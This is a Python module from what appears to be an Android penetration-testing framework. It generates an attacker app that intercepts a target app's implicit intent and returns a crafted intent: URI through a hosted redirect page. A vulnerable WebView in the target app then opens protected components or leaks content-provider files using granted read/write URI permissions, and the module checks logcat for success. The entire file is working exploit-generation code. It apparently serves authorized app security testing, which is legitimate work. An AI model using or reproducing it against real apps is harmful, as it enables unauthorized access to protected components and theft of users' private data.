from modules.android.app.app import App
from modules.android.app.template import Template
from settings.logger import get_logger
from state.opt_bool import OptBool
from state.opt_enum import OptEnum
from state.opt_list import OptList
from state.opt_str import OptStr
from state.options import option_state


log = get_logger(__name__)


class SherlockModule(App):

    def __init__(self):
        super().__init__()
        self._id = "webview_intent_uri_implicit"
        self._template = Template()


    def register_options(self):
        option_state.add_options([
            OptEnum("FILTER_LEVEL", [True, "WebView Intent URI filter level (0: No filter, 1: Filtered component) (Default: 0)", 0, [0, 1]]),
            OptBool("IS_EXPORTED", [True, "Whether the target class is exported (Default: False)", False]),
            OptBool("VIA_DEEPLINK", [True, "Communicate to target via deeplink (Default: False)", False]),
            OptStr("DEEPLINK_URI", [False, "Deeplink URI to launch target activity"]),
            OptList("INTENT_EXTRA", [False, "Intent extra data"]),
            OptStr("TARGET_PACKAGE", [True, "Target package name"]),
            OptStr("TARGET_CLASS", [True, "Target class name"]),
            OptList("REDIR_EXTRA", [True, "Redirect intent extra data"]),
            OptStr("INTENT_ACTION", [True, "Action name to intercept"]),
            OptStr("COMP_CLASS", [True, "Protected component class name"]),
            OptList("COMP_EXTRA", [False, "Protected component intent extra data"]),
            OptBool("LEAK_PROVIDER", [True, "Leak content provider (Default: False)", False]),
            OptEnum("PROVIDER_TYPE", [False, "Content provider type (1: Share content, 2: Access to files)", "", [1, 2]]),
            OptStr("PROVIDER_URI", [False, "Content provider URI to access"]),
            OptEnum("RESULT_CODE", [True, "Result code returned to the caller (Default: -1)", -1, [-1, 0, 1, "RESULT_OK", "RESULT_FIRST_USER", "RESULT_CANCELED"]])
        ])
        self.update_option_status()


    def update_option_status(self):
        opts = option_state.get_all_options()
        stat_dict = {
            "leak_provider": {
                "pos": ["provider_type", "provider_uri"],
                "neg": ["comp_class"]
            },
            "via_deeplink": {
                "pos": ["deeplink_uri"],
                "neg": ["target_class"]
            },
            "is_exported": {
                "pos": ["via_deeplink"],
                "neg": []
            }
        }
        super().update_option_status(stat_dict, opts)


    def execute(self):
        opts = self.get_options_value()

        manifest = [
            self._template.build_manifest_component(
                self.activity_name(self._id, opts['TARGET_PACKAGE'])
            ),
            self._template.build_manifest_component(
                self.intercept_activity_name(self._id, opts['TARGET_PACKAGE']), 
                is_exported=True,
                intercept=True, 
                action=opts['INTENT_ACTION']
            ),
            self._template.build_manifest_component(
                self.leak_provider_activity_name(self._id, opts['TARGET_PACKAGE']), 
                is_exported=True
            )
        ]

        intercept_activity = self._template.build_activity(
            name=self.intercept_activity_name(self._id, opts['TARGET_PACKAGE']),
            libs=[
                "android.content.Intent",
                "android.net.Uri",
                "android.os.Bundle",
                "androidx.appcompat.app.AppCompatActivity"
            ],
            on_create=[
                self._template.build_intent(
                    intent_var="target",
                    set_data=f"\"{opts['PROVIDER_URI']}\"" if opts['LEAK_PROVIDER'] else None,
                    set_selector=([self._package, f"{self._package}.{self.leak_provider_activity_name(self._id, opts['TARGET_PACKAGE'])}"] if opts['LEAK_PROVIDER'] else [opts['TARGET_PACKAGE'], opts['COMP_CLASS']]) if opts['FILTER_LEVEL'] == 1 else None,
                    put_extra=[[extra[0], f"\"{extra[1]}\""] for extra in opts['COMP_EXTRA']] if opts['COMP_EXTRA'] != "" else [],
                    set_classname=[self._package, f"{self._package}.{self.leak_provider_activity_name(self._id, opts['TARGET_PACKAGE'])}"] if opts['LEAK_PROVIDER'] else [opts['TARGET_PACKAGE'], opts['COMP_CLASS']],
                    set_flags=["Intent.FLAG_GRANT_READ_URI_PERMISSION", "Intent.FLAG_GRANT_WRITE_URI_PERMISSION"] if opts['LEAK_PROVIDER'] else [],
                    start_activity=False
                ),
                "String intentUri = target.toUri(Intent.URI_INTENT_SCHEME);",
                "String url = \"https://sherlock-93f40.web.app/?url=\" + Uri.encode(intentUri);",
                self._template.build_intent(
                    set_data="url",
                    put_extra=[[extra[0], f"\"{extra[1]}\"" if len(extra) == 2 else "url"] for extra in opts['REDIR_EXTRA']],
                    start_activity=False,
                    set_result=True,
                    result_code=opts['RESULT_CODE']
                )
            ],
            finish=True
        )

        exploit_activity = self._template.build_activity(
            name=self.activity_name(self._id, opts['TARGET_PACKAGE']),
            libs=[
                "android.content.Context",
                "android.content.Intent",
                "android.net.Uri",
                "android.os.Bundle",
                "androidx.appcompat.app.AppCompatActivity"
            ],
            bind_button=True,
            on_create=[self._template.build_intent(
                set_action="android.intent.action.VIEW" if opts['VIA_DEEPLINK'] else None,
                set_data=f"\"{opts['DEEPLINK_URI']}\"" if opts['VIA_DEEPLINK'] else None,
                put_extra=[[extra[0], f"\"{extra[1]}\""] for extra in opts['INTENT_EXTRA']] if opts['INTENT_EXTRA'] != "" else [],
                set_classname=[opts['TARGET_PACKAGE'], opts['TARGET_CLASS']] if not opts['VIA_DEEPLINK'] else []
            )]
        )

        leak_provider_activity = self._template.build_activity(
            name=self.leak_provider_activity_name(self._id, opts['TARGET_PACKAGE']),
            libs=[
                "android.content.Context",
                "android.content.Intent",
                "android.database.Cursor",
                "android.net.Uri",
                "android.os.Bundle",
                "android.util.Base64",
                "android.util.Log",
                "androidx.activity.result.ActivityResultLauncher",
                "androidx.activity.result.contract.ActivityResultContracts",
                "androidx.appcompat.app.AppCompatActivity",
                "java.io.BufferedReader",
                "java.io.FileNotFoundException",
                "java.io.IOException",
                "java.io.InputStream",
                "java.io.InputStreamReader",
                "java.nio.charset.StandardCharsets"
            ],
            on_create=[
                "Uri uri = Uri.parse(getIntent().getDataString());",
                self._template.resolve_content(opts['PROVIDER_TYPE'])
            ]
        )

        component = [
            {
                "name": f"{self.activity_name(self._id, opts['TARGET_PACKAGE'])}.java",
                "content": exploit_activity
            },
            {
                "name": f"{self.intercept_activity_name(self._id, opts['TARGET_PACKAGE'])}.java",
                "content": intercept_activity
            },
            {
                "name": f"{self.leak_provider_activity_name(self._id, opts['TARGET_PACKAGE'])}.java",
                "content": leak_provider_activity
            }
        ]

        if not opts['LEAK_PROVIDER']:
            manifest.pop()
            component.pop()
        if not opts['IS_EXPORTED']:
            manifest.pop(0)
            component.pop(0)

        app = {
            "manifest": manifest,
            "layout": self._template.button_layout(self._id, opts['TARGET_PACKAGE']) if opts['IS_EXPORTED'] else None,
            "bind_button": self._template.bind_button(self._id, opts['TARGET_PACKAGE']) if opts['IS_EXPORTED'] else None,
            "component": component
        }

        stat = {
            "failed": [
                {
                    "regex": r"^.*java\.lang\.SecurityException:.*$",
                    "msg": r"java\.lang\.SecurityException:.*"
                },
                {
                    "regex": r"^.*java\.lang\.NullPointerException:.*$",
                    "msg": r"java\.lang\.NullPointerException:.*"
                },
                {
                    "regex": r"^.*java\.lang\.RuntimeException:.*$",
                    "msg": r"java\.lang\.RuntimeException:.*"
                }
            ],
            "succeed": {
                "regex": r"^.*ELEMENTARY!!!.*$",
                "data": r"Data:.*"
            }
        }

        build_app = self.build(app)
        if not build_app:
            log.error("Process failed, terminating module.")
            return
        

        if not opts['IS_EXPORTED']:
            log.warning("Press the button displayed to execute the exploit module.")
        else:
            log.warning(f"Navigate to target class: \"{opts['TARGET_CLASS']}\" and trigger the implicit intent.")
        if not opts['LEAK_PROVIDER']:
            log.info(f"Check whether the protected component: \"{opts['COMP_CLASS']}\" is successfully accessed.")


        self.check_logcat(stat)


# DONE
# RETESTED